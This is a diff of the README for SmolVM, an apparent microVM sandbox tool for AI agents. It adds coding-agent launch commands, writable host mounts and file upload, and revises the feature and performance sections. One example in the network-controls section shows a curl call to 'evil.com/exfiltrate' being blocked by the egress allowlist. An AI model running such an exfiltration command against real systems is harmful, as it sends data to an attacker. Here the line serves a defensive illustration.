@@ -12,25 +12,27 @@
 [![License](https://img.shields.io/badge/License-Apache_2.0-orange.svg)](https://opensource.org/licenses/Apache-2.0)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10+-orange.svg)](https://www.python.org/downloads/)
 
-[Quick start](#quickstart) • [Examples](#examples) • [Features](#features) • [Performance](#performance) • [Docs](https://docs.celesto.ai) • [Community Slack](https://join.slack.com/t/celestoai/shared_invite/zt-3qc7h8gno-Nb5_PElEWHDNnGqdVzC~4Q) 
+[Quick start](#quickstart) • [Examples](#examples) • [Features](https://docs.celesto.ai/smolvm/features) • [Performance](#performance) • [Docs](https://docs.celesto.ai) • [Community Slack](https://join.slack.com/t/celestoai/shared_invite/zt-3qc7h8gno-Nb5_PElEWHDNnGqdVzC~4Q) 
 
 </div>
 
 ---
 
 SmolVM gives AI agents their own disposable computer. 
-Each microVM boots in milliseconds, runs any code or software you throw at it, keeps state when you need it, and vanishes when you don't — nothing touches your host.
+Each microVM boots in milliseconds, runs any code or software you throw at it, persists files and state across sessions, and disappears when you're done — ready to handle thousands of sandboxes in production.
 
+<br>
 
-## Features
-
-- **Sub-second boot** — VMs ready in ~500 ms.
-- **Hardware isolation** — Stronger security than containers.
-- **Network controls** — Domain allowlists for egress filtering.
-- **Browser sessions** — Full browser agents can see and control.
-- **Host mounts** — Give sandboxes read access to local directories.
-- **Snapshots** — Save and restore VM state instantly.
-- **OpenClaw** — GUI Linux apps inside a sandbox.
+| Feature | What it means for you |
+| :--- | :--- |
+| **[Sub-second boot](#performance)** | Your agent has a running VM before the API call returns (~500 ms). |
+| **[Hardware&nbsp;isolation](#security)** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Each sandbox runs in its own virtual machine with hardware-level separation. Untrusted code can't escape or access your system. |
+| **[Network controls](#network-controls)** | Lock down egress to specific domains so agents can't call home. |
+| **[Browser sandbox](#browser-sandbox)** | Agents get a full browser they can see and control in real time. |
+| **[File sharing](#mount-host-directories)** | Share local directories with the sandbox, read-only or writable. |
+| **Snapshots** | Pause a sandbox and resume it later with everything intact. |
+| **[Coding agents](#coding-agents)** | One command to launch a sandbox with Claude Code, Codex, or Pi pre-installed. |
+| **[OpenClaw](examples/openclaw.py)** | Run GUI Linux apps (IDEs, browsers, tools) inside an isolated sandbox. |
 
 
 ## Use cases
@@ -64,9 +66,9 @@ On supported Linux and macOS systems, `pip install smolvm` also pulls in the mat
 
 Linux may prompt for `sudo` during setup so it can install host dependencies and configure runtime permissions.
 
-</details>
-
 For golden-AMI builds, two-stage deploys, pinning the Firecracker version, and other non-default install paths, see [docs/installation.md](docs/installation.md).
+
+</details>
 
 ### Start a sandbox in Python
 
@@ -100,8 +102,22 @@ Open a shell inside a running sandbox:
 smolvm ssh my-sandbox
 ```
 
+## Coding agents
 
-## Browser sessions
+It sucks to “press enter and accept changes” every few seconds while using coding agents. SmolVM makes it easy to isolate the agent coding environment from the host (laptops).
+
+With a single command you get a claude/codex pre-installed sandbox ready with git credential to make you build a billion dollar business without making any mistake ;)
+
+```bash
+smolvm codex start  # start a new environment with codex preinstalled
+
+smolvm claude start  # start a new environment with claude preinstalled
+
+smolvm pi start  # start a new environment with the Pi coding agent preinstalled
+```
+
+
+## Browser sandbox
 
 SmolVM can also start a full browser inside a sandbox. This is useful when agents need to navigate websites, fill out forms, or take screenshots.
 
@@ -138,12 +154,12 @@ vm.run("curl https://api.openai.com/v1/models")    # allowed
 vm.run("curl https://evil.com/exfiltrate")         # blocked
 ```
 
-See [docs/concepts/network-egress-controls.md](docs/deep-dive/network-egress-controls.md) for how it works under the hood.
+See [docs/concepts/network-egress-controls.md](docs/concepts/network-egress-controls.md) for how it works under the hood.
 
 
 ## Mount host directories
 
-You can give a sandbox read access to a folder on your machine. This is useful when an agent needs to work with an existing project without copying files back and forth.
+You can give a sandbox access to a folder on your machine. This is useful when an agent needs to work with an existing project without copying files back and forth.
 
 ```bash
 smolvm create --mount ~/Projects/my-app
@@ -151,7 +167,7 @@ smolvm ssh my-sandbox
 ls /workspace   # your host files appear here
 ```
 
-The host folder is read-only — the sandbox can read every file, but changes stay inside the sandbox and never touch the originals. If the agent creates or edits files under `/workspace`, those changes live only in the VM's overlay layer.
+By default the host folder is read-only — the sandbox can read every file, but changes stay inside the sandbox and never touch the originals. If the agent creates or edits files under `/workspace`, those changes live only in the VM's overlay layer.
 
 Mount at a custom path, or mount multiple directories:
 
@@ -159,17 +175,50 @@ Mount at a custom path, or mount multiple directories:
 smolvm create --mount ~/Projects/my-app:/code --mount ~/data:/mnt/data
 ```
 
+When you do want the sandbox to edit your host files, add `--writable-mounts`:
+
+```bash
+smolvm create --mount ~/Projects/my-app --writable-mounts
+```
+
+Every directory passed with `--mount` becomes writable; writes from the guest are visible on the host immediately. The flag applies to all mounts on that command, so don't pair a folder you want the sandbox to modify with one you want kept untouched.
+
 The same works from Python:
 
 ```python
 from smolvm import SmolVM
 
-with SmolVM(mounts=["~/Projects/my-app"]) as vm:
-    result = vm.run("ls /workspace")
-    print(result.stdout)
+with SmolVM(mounts=["~/Projects/my-app"], writable_mounts=True) as vm:
+    vm.run("echo hello > /workspace/from-sandbox.txt")
 ```
 
-> **Note:** This feature is read-only for now. Any changes you make inside the sandbox do not travel back to the host. Write-back support is planned for a future release.
+## Upload a file
+
+You can copy one file into a running sandbox without mounting a whole folder.
+This is useful when an agent needs a config file, script, or small input file.
+
+```bash
+# Copy a file from your machine into the sandbox.
+smolvm file upload my-sandbox ./prompt.txt /tmp/prompt.txt
+
+# Open a shell in the sandbox to confirm the file is there.
+smolvm ssh my-sandbox
+# Then, inside the sandbox shell:
+cat /tmp/prompt.txt
+```
+
+The same works from Python:
+
+```python
+from smolvm import SmolVM
+
+vm = SmolVM.from_id("my-sandbox")
+vm.upload_file("./prompt.txt", "/tmp/prompt.txt")
+vm.close()
+```
+
+The destination must be an absolute path inside the sandbox (starting
+with `/`), and any existing file at that path is overwritten.
 
 
 ## Examples
@@ -211,23 +260,16 @@ SmolVM automatically trusts new sandboxes on first connection to keep setup simp
 
 ## Performance
 
-Median lifecycle timings on a standard Linux host:
+SmolVM ships a benchmark suite that measures the timings AI agents actually feel: cold start, time-to-interactive, pause/resume, and snapshot create/restore. It drives the public Python SDK on whichever backend is native to your host — Firecracker on Linux, QEMU on macOS.
 
-| Phase | Time |
-| --- | --- |
-| Create + Start | ~572 ms |
-| Ready to accept commands | ~2.1 s |
-| Command execution | ~43 ms |
-| Stop + Delete | ~751 ms |
-| **Full lifecycle (boot, run, teardown)** | **~3.5 s** |
-
-Run the benchmark yourself:
+Run it locally:
 
 ```bash
-python3 scripts/benchmarks/bench_subprocess.py --vms 10 -v
+uv run python scripts/benchmarks/bench.py
 ```
 
-Measured on AMD Ryzen 7 7800X3D (8C/16T), Ubuntu Linux. SmolVM uses [Firecracker](https://firecracker-microvm.github.io/), a lightweight virtual machine manager built for running thousands of secure, fast micro-VMs.
+See [scripts/benchmarks/README.md](scripts/benchmarks/README.md) for flags, output format, and what each metric means.
+
 
 
 ## Contributing
